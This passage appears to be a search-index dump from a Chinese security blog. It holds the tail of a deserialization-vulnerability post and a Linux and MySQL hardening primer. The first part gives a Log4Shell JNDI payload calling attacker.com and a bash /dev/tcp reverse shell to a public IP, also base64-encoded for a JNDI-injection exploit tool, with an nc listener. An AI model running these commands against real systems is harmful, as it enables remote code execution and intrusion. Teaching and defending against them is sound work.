$&#123;jndi:ldap://attacker.com/exp&#125; 这种语法，攻击者可以通过恶意日志消息触发 远程代码执行（RCE）\n使用jndi利用工具执行反弹shell (经过base64) 必须是公网的服务器\n12345bash -i &gt;&amp; /dev/tcp/8.220.194.45/7777 0&gt;&amp;18.220.194.45 → 攻击者ip7777 任意端口（后续要监听）java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84LjEzNC42OS43MS82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;8.134.69.71&quot;  \n说明：\n12345678910111213141516171819202122命令解析：bash -i &gt;&amp; /dev/tcp/8.220.194.45/7777 0&gt;&amp;1该命令用于创建一个反向Shell连接，将本地Shell会话重定向到远程主机的指定端口。以下是每个字段的详细解释：1. bash -i    bash：调用Bash Shell。    -i：以交互模式（Interactive Mode）启动Shell，允许用户输入命令并接收输出。2. &gt;&amp; /dev/tcp/8.220.194.45/7777    &gt;&amp;：将标准输出（stdout）和标准错误（stderr）重定向到指定目标。    /dev/tcp/8.220.194.45/7777：        /dev/tcp：Bash内置的虚拟设备，支持通过TCP协议进行网络通信。        8.220.194.45：远程主机的IP地址。        7777：远程主机监听的端口号。        作用：将Shell的输出和错误信息发送到远程主机的7777端口。3. 0&gt;&amp;1    0：标准输入（stdin）的文件描述符。    &gt;&amp;1：将标准输入重定向到标准输出（即远程连接）。    作用：将远程主机发送的数据作为本地Shell的输入，实现双向通信。\n再用ssh连接服务器，监听一下端口 我这里是7777\nnc -lvnp 7777\n&lt;五&gt;反序列化防护\n\n应该尽量避免用户输入反序列化的参数\n如果确实需要对不受信任的数据源进行反序列化，需要确保数据未被篡改，比如使用数字签名来检查数据的完整性\n严格控制反序列化相关函数的参数，坚持用户所输入的信息都是不可靠的原则\n做好代码审计相关工作，提高开发人员的安全意识\n\n","slug":"反序列化漏洞","date":"2025-07-18T08:00:00.000Z","categories_index":"漏洞","tags_index":"Web安全","author_index":"归尘aliez"},{"id":"52578dceeb148ed4d1a3fb12873d5ab1","title":"网安基础知识","content":"网安常用知识\n一、Linux安全基础\nLinux 是最常用于服务器的操作系统之一，在网络安全中扮演着重要角色。它的安全性依赖于许多方面，包括文件权限、用户管理、网络配置等。\n1.用户和权限管理\n\n最小权限原则：每个用户只应拥有完成任务所必需的最小权限。通过设置适当的文件权限和用户角色来控制用户对系统资源的访问。\n使用 sudo 管理权限：避免直接使用 root 用户。使用 sudo 命令可以为特定用户分配执行特定命令的权限。\n\n\n配置 /etc/sudoers 文件来管理权限：\n\n\n\n示例：\n12# 例如，允许用户 chunzi 执行所有命令chunzi    ALL=(ALL)       ALL\n设置强密码策略：\n\n\n在 /etc/login.defs 文件中，可以设置密码的长度、复杂度等要求。\n\n\n通过 passwd 命令可以强制用户定期更改密码。\n\n\n使用 pam_cracklib 模块来增强密码复杂性检查。\n\n\n\n\n通常，pam_cracklib 是作为 pam 模块的一部分预安装在大多数 Linux 发行版中的。如果你的系统没有安装，可以使用以下命令来安装它：\n\n\nsudo apt-get install libpam-cracklib  (Debian/ubuntu系统)\nsudo yum install pam_cracklib  (Centos/RHEL系统)\n1234567-  `pam_cracklib` 的配置文件通常位于 `/etc/pam.d` 目录下。你需要编辑与密码相关的 PAM 配置文件，通常是 `/etc/pam.d/common-password`（Debian 系列）或 `/etc/pam.d/system-auth`（RHEL/CentOS 系列）。 - 找到类似于 `password requisite pam_unix.so` 或 `password requisite pam_cracklib.so` 的行，加入或修改如下内容： - ```  password requisite pam_cracklib.so retry=3 minlen=8 difok=3\n\n\n\n\n\n\n用户和组管理：\n\nuseradd、usermod、groupadd 等命令用于管理用户和组。\n使用 chmod、chown、chgrp 等命令管理文件权限。\n\n\n\n\n命令\n功能\n参数选项\n示例\n\n\n\n\nuseradd\n创建新用户\n-m, -d, -s, -G\nsudo useradd -m john\n\n\nusermod\n修改现有用户\n-d, -s, -G, -a\nsudo usermod -s /bin/bash john\n\n\ngroupadd\n创建新组\n-g, -r\nsudo groupadd dev\n\n\nchmod\n更改文件或目录权限\n-R\nchmod 755 file.txt\n\n\nchown\n更改文件或目录的所有者和所属组\n-R\nsudo chown john:dev file.txt\n\n\nchgrp\n更改文件或目录的所属组\n-R\nsudo chgrp dev file.txt\n\n\n\n2. 防火墙配置 (iptables / firewalld)\n\n\n使用 iptables或 firewalld来配置防火墙规则，防止未授权的访问。\n\n\niptables 配置示例：\n\n\niptables -A INPUT -p tcp --dport 22 -j ACCEPT  # 允许 SSH 访问\niptables -A INPUT -p tcp --dport 80 -j ACCEPT  # 允许 HTTP 访问\niptables -A INPUT -j DROP  # 默认拒绝所有其他输入流量\n123456789101112131415-  配置完成后，使用 `service iptables save` 保存规则。 #### 3. **系统日志和审计**-  **日志管理**：Linux 系统通过 `/var/log` 目录记录所有重要操作和系统事件。`syslog`、`auth.log` 和 `messages` 等日志文件可以提供有价值的信息，帮助审计系统行为   - 使用 `logwatch` 工具定期查看日志文件并自动生成报告。  - 配置 `rsyslog` 进行集中日志管理。#### 4. **SSH 配置**- **禁用 root 用户远程登录**：修改 `/etc/ssh/sshd_config` 文件，禁用 root 登录：```bashPermitRootLogin no\n\n\n\n\n\n\n使用密钥认证：禁用密码认证，只允许使用 SSH 密钥进行登录：\n\n\nPasswordAuthentication no\n12345-  **更改默认端口**：避免使用默认的 22 端口，可以在 `sshd_config` 中修改： - ```bash  Port 2222\n\n\n\n\n二、MySQL 安全基础\nMySQL 是流行的关系型数据库管理系统。保护 MySQL 数据库的安全非常重要，因为它存储了应用程序的关键数据。\n1. 数据库用户和权限管理\n最小权限原则：为每个数据库用户设置最小的访问权限，避免用户拥有过多的权限。\n\n使用 GRANT 命令为用户分配权限：\n\n  1GRANT SELECT, INSERT ON database_name.* TO &#x27;user&#x27;@&#x27;host&#x27;;\n\n通过 REVOKE 命令撤销权限：\n\n  1REVOKE ALL PRIVILEGES ON database_name.* FROM &#x27;user&#x27;@&#x27;host&#x27;;\n\n定期审计用户权限，确保不再需要的用户被删除。\n\n2. 配置 MySQL 密码策略\n\n\n使用 validate_password 插件强制实施密码复杂性要求。你可以通过以下命令启用：\n1INSTALL PLUGIN validate_password SONAME &#x27;validate_password.so&#x27;;\n\n\n配置密码长度、复杂度和过期时间等要求\n\n\n  12SET GLOBAL validate_password.policy=2;  # 设置密码策略SET GLOBAL validate_password.length=12;  # 设置密码最小长度\n3. 加密和数据保护\n\n\n启用 SSL 加密为了确保客户端与服务器之间的通信安全，可以启用 SSL 加密。\n\n生成证书并配置 MySQL 使用 SSL：\n\n1ALTER USER &#x27;user&#x27;@&#x27;host&#x27; REQUIRE SSL;\n\n\n4. 配置 my.cnf 安全选项\n\n\n修改 my.cnf 配置文件，禁用远程 root 登录：\n123[mysqld]skip-networkingbind-address = 127.0.0.1  # 只允许本地访问\n\n\n5. 定期备份\n\n\n配置定期的数据库备份策略，使用 mysqldump 或 xtrabackup 等工具进行备份。\n1mysqldump -u root -p database_name &gt; backup.sql\n\n\n三、Shell 脚本在网络安全中的应用\nShell 脚本在网络安全中通常用于自动化任务，比如日志分析、安全检查、定期备份等。通过编写 Shell 脚本，可以减少人工操作，提升工作效率。\n1. 文件权限审计脚本\n\n\n定期检查敏感文件和目录的权限，确保没有错误的权限设置。\n12345678#!/bin/bashFILES_TO_CHECK=(&quot;/etc/passwd&quot; &quot;/etc/shadow&quot; &quot;/etc/ssh/sshd_config&quot;)for file in &quot;$&#123;FILES_TO_CHECK[@]&#125;&quot;; do    if [ -e &quot;$file&quot; ]; then        echo &quot;Checking permissions for $file&quot;        ls -l $file    fidone\n\n\n2. 定期检查端口开放状态\n\n\n使用 netstat 或 ss 命令检查开放端口，确保没有不必要的端口暴露。\n1234#!/bin/bashOPEN_PORTS=$(netstat -tuln | grep -E &#x27;^tcp|^udp&#x27;)echo &quot;Open Ports:&quot;echo &quot;$OPEN_PORTS&quot;\n\n\n3. 日志分析脚本\n\n\n定期分析 SSH 登录日志，检测暴力破解尝试。\n12345#!/bin/bashLOG_FILE=&quot;/var/log/auth.log&quot;FAILED_LOGINS=$(grep &quot;Failed password&quot; $LOG_FILE)echo &quot;Failed login attempts:&quot;echo &quot;$FAILED_LOGINS&quot;\n\n\n4. 自动化安全更新脚本\n\n\n定期更新系统和软件包，确保漏洞得到及时修复。\n12345#!/bin/bashapt update &amp;&amp; apt upgrade -y  # 对于 Debian/Ubuntu 系统sudo yum check-update      # CentOS 7 或更早版本sudo dnf check-update      # CentOS 8 或更高版本\n\n\n","slug":"网安常用知识","date":"2025-07-16T08:00:00.000Z","categories_index":"网安基础","tags_index":"Web安全","author_index":"归尘aliez"}]